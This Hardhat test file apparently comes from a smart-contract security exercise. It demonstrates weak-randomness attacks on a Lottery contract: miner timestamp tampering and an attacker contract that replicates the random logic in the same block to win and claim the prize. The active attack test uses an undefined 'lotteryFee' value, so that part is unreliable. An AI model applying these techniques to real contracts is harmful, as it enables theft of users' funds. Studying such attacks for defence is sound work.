const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Weak Randomness", function () {
  let deployer, attacker, user;

  beforeEach(async function () {
    [deployer, attacker, user] = await ethers.getSigners();

    const Lottery = await ethers.getContractFactory("Lottery", deployer);
    this.lottery = await Lottery.deploy();

    const LotteryAttacker = await ethers.getContractFactory("LotteryAttacker", attacker);
    this.lotteryAttacker = await LotteryAttacker.deploy(this.lottery.address);
  });

  describe("Lottery", function () {
    describe.skip("With bets open", function () {
      it("Should allow a user to place a bet", async function () {
        await this.lottery.placeBet(5, { value: ethers.utils.parseEther("10") });
        expect(await this.lottery.bets(deployer.address)).to.eq(5);
      });
      it("Should revert if a user place more than 1 bet", async function () {
        await this.lottery.placeBet(5, { value: ethers.utils.parseEther("10") });
        await expect(this.lottery.placeBet(150, { value: ethers.utils.parseEther("10") })).to.be.revertedWith("Only 1 bet per player");
      });
      it("Should revert if bet is != 10 eth", async function () {
        await expect(this.lottery.placeBet(150, { value: ethers.utils.parseEther("5") })).to.be.revertedWith("Bet cost: 10 ether");
        await expect(this.lottery.placeBet(150, { value: ethers.utils.parseEther("15") })).to.be.revertedWith("Bet cost: 10 ether");
      });
      it("Should revert if bet number is not > 0", async function () {
        await expect(this.lottery.placeBet(0, { value: ethers.utils.parseEther("10") })).to.be.revertedWith("Must be a number from 1 to 255");
      });
    });
    describe.skip("With bets closed", function () {
      it("Should revert if a user place a bet", async function () {
        await this.lottery.endLottery();
        await expect(this.lottery.placeBet(150, { value: ethers.utils.parseEther("10") })).to.be.revertedWith("Bets are closed");
      });
      it.skip("Should allow only the winner to call withdrawPrice()", async function () {
        await this.lottery.connect(user).placeBet(5, { value: ethers.utils.parseEther("10") });
        await this.lottery.connect(attacker).placeBet(150, { value: ethers.utils.parseEther("10") });
        await this.lottery.placeBet(73, { value: ethers.utils.parseEther("10") });

        let winningNumber = 0;

        while (winningNumber != 5) {
          await this.lottery.endLottery();
          winningNumber = await this.lottery.winningNumber();
          console.log(winningNumber);
        }

        await expect(this.lottery.connect(attacker).withdrawPrize()).to.be.revertedWith("You aren't the winner");

        const userInitialBalance = await ethers.provider.getBalance(user.address);
        await this.lottery.connect(user).withdrawPrize();
        const userFinalBalance = await ethers.provider.getBalance(user.address);

        expect(userFinalBalance).to.be.gt(userInitialBalance);
      });
    });
    describe("Attack", function () {
      it.skip("A miner could tamper the results", async function () {
        await this.lottery.connect(attacker).placeBet(5, { value: ethers.utils.parseEther("10") });
        await this.lottery.connect(user).placeBet(150, { value: ethers.utils.parseEther("10") });
        await this.lottery.placeBet(73, { value: ethers.utils.parseEther("10") });

        await ethers.provider.send("evm_setNextBlockTimestamp", [1637102259]);

        let winningNumber = 0;

        while (winningNumber != 5) {
          await this.lottery.endLottery();
          winningNumber = await this.lottery.winningNumber();
          console.log(winningNumber);
        }

        console.log(await ethers.provider.getBlock("latest"));

        const attackerInitialBalance = await ethers.provider.getBalance(attacker.address);
        await this.lottery.connect(attacker).withdrawPrize();
        const attackerFinalBalance = await ethers.provider.getBalance(attacker.address);

        expect(attackerFinalBalance).to.be.gt(attackerInitialBalance);
      });
      /*
      it("Replicate random logic within the same block", async function () {
        await this.lotteryAttacker.attack({ value: ethers.utils.parseEther("10") });
        await this.lottery.endLottery();
        await ethers.provider.send("evm_mine");

        console.log("Attacker number: " + (await this.lottery.bets(this.lotteryAttacker.address)));
        console.log("Winning number: " + (await this.lottery.winningNumber()));
      });
      */
    });
  });
  
  describe("Attacking the Lottery Contract - Replicated Logic Attack", function () {
    it("Place a bet on the same block where the endLottery() will be mined", async function () {
      // Placing some bets - Just to increase the reward to be claimed
      await this.lottery.connect(user).placeBet(3, { value: this.lotteryFee })
      await this.lottery.placeBet(1, { value: this.lotteryFee })
      await ethers.provider.send("evm_mine");

      // Performing the Replicated Logic Attack
      await this.lotteryAttacker.connect(attacker).attack({ value: this.lotteryFee })
      await this.lottery.endLottery();

      // Manually mine the next block -- Will be included the two above transactions on the same block
      await ethers.provider.send("evm_mine");
      console.log(await ethers.provider.getBlock("latest"));

      console.log("Winning Number was: ", await this.lottery.winningNumber());
      console.log("Contract Attacker bet using the number: ", await this.lottery.bets(this.lotteryAttacker.address));

      console.log("================= ETH Balances BEFORE claiming the rewards =================");
      console.log("Lottery contract ETH Balance" , await ethers.provider.getBalance(this.lottery.address));
      console.log("Attacker contract ETH Balance" , await ethers.provider.getBalance(this.lotteryAttacker.address));
      console.log("Attacker Account ETH Balance" , await ethers.provider.getBalance(attacker.address));

      const attackerBalanceBefore = await ethers.provider.getBalance(attacker.address); 
      // Claim the rewards from the Attacker contract
      await this.lotteryAttacker.connect(attacker).claimReward();
      await ethers.provider.send("evm_mine");
      const attackerBalanceAfter = await ethers.provider.getBalance(attacker.address);

      console.log("================= ETH Balances AFTER claiming the rewards =================");
      console.log("Lottery contract ETH Balance" , await ethers.provider.getBalance(this.lottery.address));
      console.log("Attacker contract ETH Balance" , await ethers.provider.getBalance(this.lotteryAttacker.address));
      console.log("Attacker Account ETH Balance" , await ethers.provider.getBalance(attacker.address));

      // Comparing two numbers
      expect(attackerBalanceAfter).to.be.gt(attackerBalanceBefore);
    })
  });
  
});
